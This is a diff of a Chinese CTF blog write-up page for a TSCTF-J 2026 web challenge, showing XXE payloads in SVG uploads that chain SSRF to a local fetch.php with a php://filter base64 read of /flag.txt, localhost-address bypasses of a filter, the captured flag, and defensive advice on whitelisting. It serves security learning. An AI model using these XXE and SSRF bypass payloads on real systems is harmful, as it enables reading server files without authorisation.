 <figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (source === <span class="string">&quot;svg&quot;</span> &amp;&amp; target === <span class="string">&quot;png&quot;</span>) &#123;</span><br><span class="line">	<span class="keyword">const</span> text = <span class="keyword">await</span> <span class="title function_">blobToText</span>(file);</span><br><span class="line">	<span class="keyword">if</span> (<span class="regexp">/&lt;!\s*(doctype|entity)|SYSTEM\s+[&quot;&#x27;]/i</span>.<span class="title function_">test</span>(text)) &#123;</span><br><span class="line">		<span class="title function_">setStatus</span>(<span class="string">&quot;Sending SVG to the workshop renderer...&quot;</span>);</span><br><span class="line">		<span class="keyword">return</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>
-<p>我们可以猜想是以svg为载体的XXE漏洞，首先尝试在ENTITY字段包含外部实体flag.txt（可惜的是，笔者当时并不会正则表达式，并没有看懂这个发送到服务端的规则…）</p>
+<p>可以发现，这段正则表达式需要满足形如下面的xml格式（其实就是注意\s这个空白字符类喵）：</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;! DOCTYPE svg [</span><br><span class="line">	&lt;! ENTITY flag SYSTEM &quot;外部实体&quot;&gt;</span><br><span class="line">	]&gt;	</span><br><span class="line"><span class="tag">&lt;<span class="name">svg</span> <span class="attr">height</span>=<span class="string">&quot;900&quot;</span> <span class="attr">width</span>=<span class="string">&quot;900&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">text</span> <span class="attr">x</span>=<span class="string">&quot;10&quot;</span> <span class="attr">y</span>=<span class="string">&quot;20&quot;</span>&gt;</span><span class="symbol">&amp;flag;</span><span class="tag">&lt;/<span class="name">text</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">svg</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p>又注意到提示：<code>祝尼魔们会拦下不少本机地址，却会收下用filter包好的信。</code><br>
+本来猫猫们希望用127.0.0.1，也就是常见的本机地址，加上filter（这个其实不用提示，因为包含了之后会提示有<code>sensitive keywords</code>，第一反应就是用base64的filter过滤器包裹起来喵）来进行一个读flag喵。结果被鹈鹕镇的坏人们拦下来了喵😡😭猫猫很生气，决定要用更多的本机地址来打喵！<br>
+于是换了个0就过了，看来鹈鹕镇的大家都很喜欢0（×</p>
+<p>最后在windows的点击以执行的帮助下，成功拿到flag，就是成功率很难评，最好还是手打喵。</p>
+<p><img src="/images/rt/tsctf-j-26/new/click.png" alt=""></p>
+<p>解码后得到flag：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">TSCTF-J&#123;Cr07-In-534Rbh-0f-10sT_6@k3_@7D_fl3g40f2f86&#125;</span><br></pre></td></tr></table></figure>
+<details class="flatpaper-note flatpaper-note--primary"><summary class="flatpaper-note__title"><span class="flatpaper-note__icon" aria-hidden="true"></span><span class="flatpaper-note__label">这里叕是当时笔者的混乱思考链喵，追求真实心态请看这里喵</span><span class="flatpaper-note__chevron" aria-hidden="true"></span></summary><div class="flatpaper-note__body"><p>我们可以猜想是以svg为载体的XXE漏洞，首先尝试在ENTITY字段包含外部实体flag.txt（可惜的是，笔者当时并不会正则表达式，并没有看懂这个发送到服务端的规则…）</p>
 <figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">svg</span> [</span></span><br><span class="line"><span class="meta">  <span class="meta">&lt;!ENTITY <span class="keyword">flag</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;http://127.0.0.1/fetch.php?url=php://filter/read=convert.base64-encode/resource=flag.txt&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">svg</span> <span class="attr">height</span>=<span class="string">&quot;900&quot;</span> <span class="attr">width</span>=<span class="string">&quot;900&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">text</span> <span class="attr">x</span>=<span class="string">&quot;10&quot;</span> <span class="attr">y</span>=<span class="string">&quot;20&quot;</span>&gt;</span><span class="symbol">&amp;flag;</span><span class="tag">&lt;/<span class="name">text</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">svg</span>&gt;</span></span><br></pre></td></tr></table></figure>
 <p>提示：<code>The Junimos found sensitive keywords within y our XML. Go refine it!</code>，显然是撞上WAF了。由于笔者是个彩笔，首先去问了ds的网页版，给了一个hint（后来发现没有用），让我把编码换成utf-16尝试绕过——<br>
 然而只有一个<code>Portrait conversion completed.</code>的响应，flag并没有出现。但是发现如果直接上传一个正常的svg，题目仍然是可以解析它的，但是bp拦截后发现是在<strong>本地浏览器</strong>上解析，随后会立刻被返回的<code>Portrait conversion completed.</code>页面盖掉，这个方向显然是不太能够走通了。</p>
@@ -699,13 +771,14 @@
 短写（<code>127.1</code>）、IPv6 映射（<code>[::ffff:127.0.0.1]</code>）、<code>0.0.0.0</code>、DNS 重绑定、<code>@</code> 混淆……<br>
 更根本的是，<strong>只解析 host 也不够</strong>——还要考虑重定向、DNS 解析结果。<br>
 正确做法：<strong>白名单</strong>（只允许明确的域名/协议）+ 解析后校验目标 IP 是否落在内网段。</p>
-</blockquote>
+</blockquote></div></details>
 <p>这样一来，我们就把抓flag这个操作，转化为了具象的服务端的LFI，从而拿到flag，具体payload如下：</p>
 <figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span></span><br><span class="line">&lt;! DOCTYPE svg [ &lt;! ENTITY xxe SYSTEM &quot;http://0/fetch.php?url=php://filter/convert.base64-encode/resource=/flag.txt&quot;&gt; ]&gt;</span><br><span class="line"><span class="tag">&lt;<span class="name">svg</span> <span class="attr">height</span>=<span class="string">&quot;900&quot;</span> <span class="attr">width</span>=<span class="string">&quot;900&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">text</span> <span class="attr">x</span>=<span class="string">&quot;10&quot;</span> <span class="attr">y</span>=<span class="string">&quot;20&quot;</span>&gt;</span><span class="symbol">&amp;xxe;</span><span class="tag">&lt;/<span class="name">text</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">svg</span>&gt;</span></span><br></pre></td></tr></table></figure>
 <p>– 总结：</p>
 <ol>
 <li>对于常见waf的绕过，很值得试的一点就是加上/去掉空格，这看上去至少是这位出题人最喜欢用的办法。</li>
 <li>后来感觉严格意义上这不算waf……因为正则都写在前端暴露的源码里了。真正算waf的，大概在于ban掉的一堆本地域名，要不是这题的话我真只知道127和localhost。</li>
+<li>对于本地域名和开心地和WAF斗智斗勇的有趣探讨，可以参见[miso](<a target="_blank" rel="noopener" href="https://miso2233.github.io/2026/10/21/tsctf-j-2026-wp/#%E4%B8%8Exml-waf%E5%92%8C%E6%89%A7%E8%A1%8C%E5%99%A8%E6%96%97%E6%99%BA%E6%96%97%E5%8B%87">TSCTF-J 2026 Web 五题 WriteUp - Miso的博客 | Miso Blog</a>)和[maple](<a target="_blank" rel="noopener" href="https://map1e-suk1.github.io/posts/%E8%A1%A5%E5%85%85-tsctf-j-2026-writeup/#%E5%90%8E%E6%97%A5%E8%B0%88">【补充】TSCTF-J 2026 Writeup - Map1e-Suk1的秘密基地</a>)两只猫猫的wp！</li>
 </ol>
 <h2 id="AI">AI</h2>
 <h3 id="T1-Liar’s-Bar">T1-Liar’s Bar</h3>
@@ -764,18 +837,18 @@
 
   <nav class="article-actions">
     
-      <a class="article-action article-action--prev" href="/2026/10/16/moe2026_web/">
+      <a class="article-action article-action--prev" href="/2026/10/10/%E5%AF%B9%E4%BA%8E%E5%85%A5%E5%AD%A6%E4%BB%A5%E6%9D%A5%E7%9A%84%E6%80%9D%E8%80%83%E4%B8%8E%E6%80%BB%E7%BB%93/">
         
 <svg xmlns="http://www.w3.org/2000/svg" width="1em" height="1em" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-arrow-left flatpaper-icon flatpaper-icon--lucide" aria-hidden="true"><use href="/icons.svg#flatpaper-icon-lucide-arrow-left"></use></svg>
 
         <span class="action-label">上一篇</span>
-        <span class="action-title">moectf 2026-web write-up</span>
+        <span class="action-title">对于入学以来的思考与总结</span>
       </a>
     
     
-      <a class="article-action article-action--next" href="/2026/10/10/%E5%AF%B9%E4%BA%8E%E5%85%A5%E5%AD%A6%E4%BB%A5%E6%9D%A5%E7%9A%84%E6%80%9D%E8%80%83%E4%B8%8E%E6%80%BB%E7%BB%93/">
+      <a class="article-action article-action--next" href="/2026/09/29/gal_CloverDays/">
         <span class="action-label">下一篇</span>
-        <span class="action-title">对于入学以来的思考与总结</span>
+        <span class="action-title">Clover Days(占位标题)</span>
         
 <svg xmlns="http://www.w3.org/2000/svg" width="1em" height="1em" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-arrow-right flatpaper-icon flatpaper-icon--lucide" aria-hidden="true"><use href="/icons.svg#flatpaper-icon-lucide-arrow-right"></use></svg>
 
@@ -806,26 +879,10 @@
     </header>
     <div class="related-paper__grid">
       
-        <a class="related-card" href="/2026/10/20/10-19%20%E4%B8%A4%E9%A2%98/">
-          <span class="related-card__thumb">
-            
-<div class="paper-thumb paper-thumb-0 paper-thumb--cover">
-  
-    <img class="paper-thumb__img" src="/images/cover/yuri_001.webp" alt="10-19 来自DASCTF站的两题" loading="lazy" referrerpolicy="no-referrer">
-  
-</div>
-
-          </span>
-          <span class="related-card__body">
-            <strong class="related-card__title">10-19 来自DASCTF站的两题</strong>
-            <em class="related-card__date">2026-10-20</em>
-          </span>
-        </a>
-      
         <a class="related-card" href="/2026/10/20/10-20%20%E4%B8%80%E9%A2%98/">
           <span class="related-card__thumb">
             
-<div class="paper-thumb paper-thumb-1 paper-thumb--cover">
+<div class="paper-thumb paper-thumb-0 paper-thumb--cover">
   
     <img class="paper-thumb__img" src="/images/cover/yuri_001.webp" alt="10-20 来自DASCTF站的一题" loading="lazy" referrerpolicy="no-referrer">
   
@@ -834,6 +891,22 @@
           </span>
           <span class="related-card__body">
             <strong class="related-card__title">10-20 来自DASCTF站的一题</strong>
+            <em class="related-card__date">2026-10-20</em>
+          </span>
+        </a>
+      
+        <a class="related-card" href="/2026/10/20/10-19%20%E4%B8%A4%E9%A2%98/">
+          <span class="related-card__thumb">
+            
+<div class="paper-thumb paper-thumb-1 paper-thumb--cover">
+  
+    <img class="paper-thumb__img" src="/images/cover/yuri_001.webp" alt="10-19 来自DASCTF站的两题" loading="lazy" referrerpolicy="no-referrer">
+  
+</div>
+
+          </span>
+          <span class="related-card__body">
+            <strong class="related-card__title">10-19 来自DASCTF站的两题</strong>
             <em class="related-card__date">2026-10-20</em>
           </span>
         </a>
